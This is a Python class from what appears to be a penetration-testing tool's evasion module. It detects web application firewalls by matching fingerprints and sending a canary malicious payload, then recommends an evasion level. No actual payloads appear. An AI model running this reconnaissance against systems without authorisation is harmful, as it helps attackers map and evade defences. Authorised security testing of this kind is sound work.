class WAFDetector:
    """
    Two-phase WAF detection:
      Phase 1 (passive): Send a benign GET / and analyze response headers,
                         cookies, and body for known WAF fingerprints.
      Phase 2 (active):  Send a canary malicious payload and compare the
                         response to the benign baseline. If the response
                         diverges (different status, block page), confirm WAF.

    Usage:
        from autopnex.evasion.waf_detector import WAFDetector
        detector = WAFDetector()
        info = detector.detect("https://target.example.com")
        print(info.vendor, info.confidence, info.evidence)
    """

    def __init__(self):
        self._signatures = WAF_SIGNATURES

    def detect(self, target_url: str) -> WAFInfo:
        from autopnex.tools._http import request, normalise_target

        target = normalise_target(target_url)
        info = WAFInfo()

        # ── Phase 1: Passive fingerprint from benign request ────────────
        resp_benign, err, _ = request("GET", target)
        if resp_benign is None:
            info.evidence.append(f"benign request failed: {err}")
            return info

        benign_status = resp_benign.status_code
        benign_headers = dict(resp_benign.headers)
        benign_body = (resp_benign.text or "")[:8000]
        benign_cookies = resp_benign.headers.get("set-cookie", "")
        info.headers_seen = {k.lower(): v for k, v in benign_headers.items()}

        vendor_scores: Dict[WAFVendor, float] = {}

        for vendor, sigs in self._signatures.items():
            score = 0.0

            # Check response headers
            for header_name, pattern in sigs.get("headers", {}).items():
                header_val = benign_headers.get(header_name, "")
                if not header_val:
                    for k, v in benign_headers.items():
                        if k.lower() == header_name.lower():
                            header_val = v
                            break
                if header_val and re.search(pattern, header_val, re.IGNORECASE):
                    score += 0.3
                    info.evidence.append(
                        f"header match: {header_name}={header_val!r} → {vendor.value}"
                    )

            # Check cookies
            for cookie_pat in sigs.get("cookies", []):
                if re.search(cookie_pat, benign_cookies, re.IGNORECASE):
                    score += 0.25
                    info.evidence.append(
                        f"cookie match: {cookie_pat} → {vendor.value}"
                    )

            # Check body patterns (on benign — some WAFs inject JS challenges)
            for body_pat in sigs.get("body_patterns", []):
                if re.search(body_pat, benign_body, re.IGNORECASE):
                    score += 0.2
                    info.evidence.append(
                        f"body match (benign): {body_pat!r} → {vendor.value}"
                    )

            if score > 0:
                vendor_scores[vendor] = min(score, 1.0)

        # ── Phase 2: Active probe with canary payload ────────────────
        canary = CANARY_PAYLOADS[0]
        canary_url = target.rstrip("/") + f"/?q={canary}"
        resp_canary, err_canary, _ = request("GET", canary_url)

        if resp_canary is not None:
            canary_status = resp_canary.status_code
            canary_body = (resp_canary.text or "")[:8000]

            # Status divergence: benign was 200 but canary is 403/406/429/503
            if benign_status == 200 and canary_status in (403, 406, 429, 451, 501, 503):
                info.block_status_code = canary_status
                info.evidence.append(
                    f"status divergence: benign={benign_status}, canary={canary_status}"
                )
                for vendor, sigs in self._signatures.items():
                    if canary_status in sigs.get("block_codes", []):
                        vendor_scores[vendor] = vendor_scores.get(vendor, 0) + 0.3

                    for body_pat in sigs.get("body_patterns", []):
                        if re.search(body_pat, canary_body, re.IGNORECASE):
                            vendor_scores[vendor] = vendor_scores.get(vendor, 0) + 0.35
                            info.evidence.append(
                                f"body match (canary block page): {body_pat!r} → {vendor.value}"
                            )

                # Generic WAF detection even if no vendor matched
                if not vendor_scores:
                    vendor_scores[WAFVendor.GENERIC] = 0.6
                    info.evidence.append("canary blocked but no vendor signature matched")

            # Body length divergence: if canary response is vastly different
            len_delta = abs(len(canary_body) - len(benign_body))
            if len_delta > max(500, 0.5 * len(benign_body)) and canary_status != benign_status:
                info.evidence.append(
                    f"body length divergence: benign={len(benign_body)}, canary={len(canary_body)}"
                )

        elif err_canary:
            # Connection reset / timeout on canary can indicate aggressive WAF
            info.evidence.append(f"canary request failed: {err_canary} (possible connection-level block)")

        # ── Determine winner ────────────────────────────────────────
        if vendor_scores:
            best_vendor = max(vendor_scores, key=vendor_scores.get)
            best_score = vendor_scores[best_vendor]
            info.detected = True
            info.vendor = best_vendor
            info.confidence = min(best_score, 1.0)
            info.recommended_level = "aggressive" if best_score >= 0.5 else "light"
        else:
            info.detected = False
            info.vendor = WAFVendor.UNKNOWN
            info.confidence = 0.0

        return info


